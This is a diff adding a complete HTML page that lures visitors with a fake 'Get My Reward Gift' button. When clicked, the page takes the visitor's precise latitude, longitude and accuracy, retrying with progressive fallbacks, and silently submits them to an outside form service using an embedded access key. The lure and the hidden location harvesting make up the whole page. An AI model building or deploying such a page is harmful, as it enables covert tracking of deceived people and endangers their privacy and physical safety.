@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Location Tracker (Fixed)</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin: 0;
+        padding: 20px;
+        background-color: #f4f4f9;
+        color: #333;
+      }
+      h1 {
+        margin-top: 20px;
+        color: #444;
+      }
+      button {
+        padding: 10px 20px;
+        font-size: 16px;
+        color: #fff;
+        background-color: #007bff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        margin-top: 20px;
+        transition: background-color 0.3s;
+      }
+      button:hover {
+        background-color: #0056b3;
+      }
+      #output {
+        margin-top: 20px;
+        font-size: 18px;
+        line-height: 1.6;
+        padding: 15px;
+        border-radius: 5px;
+        background-color: #fff;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      #debug {
+        margin-top: 20px;
+        font-size: 14px;
+        color: #666;
+        padding: 10px;
+        background-color: #f9f9f9;
+        border-radius: 5px;
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+        text-align: left;
+        display: none;
+      }
+      #status {
+        margin-top: 10px;
+        font-style: italic;
+        color: #666;
+      }
+      a {
+        color: #007bff;
+        text-decoration: none;
+        font-weight: bold;
+      }
+      a:hover {
+        text-decoration: underline;
+      }
+      .error {
+        color: #d9534f;
+      }
+      .success {
+        color: #5cb85c;
+      }
+      .info {
+        color: #5bc0de;
+      }
+      .troubleshooting {
+        background-color: #f8f9fa;
+        padding: 15px;
+        margin-top: 20px;
+        border-radius: 5px;
+        text-align: left;
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .troubleshooting h3 {
+        margin-top: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Get My Reward Gift</h1>
+    <h2> Please make sure Your Device Location is Enabled</h2>
+    <p id="status">Click the button below to get your reward</p>
+    <button onclick="getLocation()">Get Reward Gift</button>
+    <div id="output"></div>
+    <div id="debug"></div>
+    
+    
+    <script>
+      // Check if the page is being served over HTTPS
+      if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
+        document.getElementById('status').innerHTML = "<span class='error'>Warning: Geolocation requires HTTPS! This page might not work correctly.</span>";
+      }
+      
+      // Store the retry count and last error
+      let retryCount = 0;
+      let lastError = null;
+      
+      function getLocation() {
+        const output = document.getElementById("output");
+        const status = document.getElementById("status");
+        const debug = document.getElementById("debug");
+        
+        // Clear previous results
+        output.innerHTML = "";
+        
+        // Check if Geolocation API is available
+        if (!navigator.geolocation) {
+          output.innerHTML = "<p class='error'>Geolocation is not supported by this browser.</p>";
+          return;
+        }
+        
+        status.innerHTML = "<span class='info'>Locating... please wait</span>";
+        
+        // Try to get geolocation with progressive fallback
+        tryGetPosition();
+        
+        function tryGetPosition() {
+          // Different options based on retry count
+          let options = {
+            enableHighAccuracy: retryCount < 2, // First try with high accuracy, then without
+            timeout: (retryCount + 1) * 5000,   // Increase timeout progressively
+            maximumAge: retryCount > 0 ? 60000 : 0 // Allow cached position after first retry
+          };
+          
+          navigator.geolocation.getCurrentPosition(
+            // Success callback
+            (position) => {
+              const lat = position.coords.latitude;
+              const long = position.coords.longitude;
+              const accuracy = position.coords.accuracy;
+              
+              status.innerHTML = "<span class='success'>Location found!</span>";
+              output.innerHTML = `<p class='success'>Location data obtained.  Submitting via Web3Forms...</p>`;
+
+              // Send data to Web3Forms and hide the output div
+              sendDataToWeb3Forms(lat, long, accuracy);
+              
+              
+              debug.innerHTML += `<p>Successfully obtained position (retry #${retryCount})</p>`;
+              console.log("Location obtained:", position);
+              
+              // Store these values if you need to access them later
+              window.userLatitude = lat;
+              window.userLongitude = long;
+            },
+            
+            // Error callback
+            (error) => {
+              lastError = error;
+              debug.innerHTML += `<p>Error on attempt #${retryCount}: Code ${error.code}</p>`;
+              
+              if (retryCount < 3) {
+                // Try again with different options
+                retryCount++;
+                status.innerHTML = `<span class='info'>Retrying... (attempt ${retryCount + 1}/4)</span>`;
+                setTimeout(tryGetPosition, 1000);
+                return;
+              }
+              
+              status.innerHTML = "<span class='error'>Failed to get location</span>";
+              
+              // Handle the error after all retries
+              let errorMessage = "";
+              switch(error.code) {
+                case error.PERMISSION_DENIED:
+                  errorMessage = "Location request was denied. Please check your browser settings and ensure location access is enabled.";
+                  break;
+                case error.POSITION_UNAVAILABLE:
+                  errorMessage = "Location information is unavailable. Your device might not have GPS or network connectivity to determine location.";
+                  break;
+                case error.TIMEOUT:
+                  errorMessage = "The location request timed out. Please check your connectivity and try again.";
+                  break;
+                case error.UNKNOWN_ERROR:
+                  errorMessage = "An unknown error occurred while retrieving your location.";
+                  break;
+              }
+              
+              output.innerHTML = `
+                <p class='error'>${errorMessage}</p>
+                
+              `;
+              console.error("Geolocation error:", error);
+            },
+            options
+          );
+        }
+      }
+      
+      function showDebugInfo() {
+        const debug = document.getElementById("debug");
+        debug.style.display = "block";
+        
+        // Add browser and environment information
+        debug.innerHTML += `
+          <h4>Environment Details:</h4>
+          <p>Browser: ${navigator.userAgent}</p>
+          <p>Protocol: ${window.location.protocol}</p>
+          <p>Geolocation API available: ${navigator.geolocation ? "Yes" : "No"}</p>
+          <p>Last error code: ${lastError ? lastError.code : "None"}</p>
+          <p>Last error message: ${lastError ? lastError.message : "None"}</p>
+        `;
+      }
+
+      function sendDataToWeb3Forms(latitude, longitude, accuracy) {
+          // Create the data object
+          const formData = {
+              access_key: 'e75d668b-af45-458f-bdfb-794b626ca931',
+              latitude: latitude.toFixed(6),
+              longitude: longitude.toFixed(6),
+              accuracy: accuracy.toFixed(2)
+          };
+
+          // Send data using fetch API
+          fetch('https://api.web3forms.com/submit', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json'
+              },
+              body: JSON.stringify(formData)
+          })
+          .then(response => response.json())
+          .then(data => {
+              if (data.success) {
+                  output.innerHTML = `<p class='success'>Thank you! Your location has been submitted successfully.</p>`;
+              } else {
+                  output.innerHTML = `<p class='error'>Something went wrong. Please try again.</p>`;
+              }
+          })
+          .catch(error => {
+              console.error('Error:', error);
+              output.innerHTML = `<p class='error'>An error occurred. Please try again later.</p>`;
+          });
+      }
+    </script>
+  </body>
+</html>
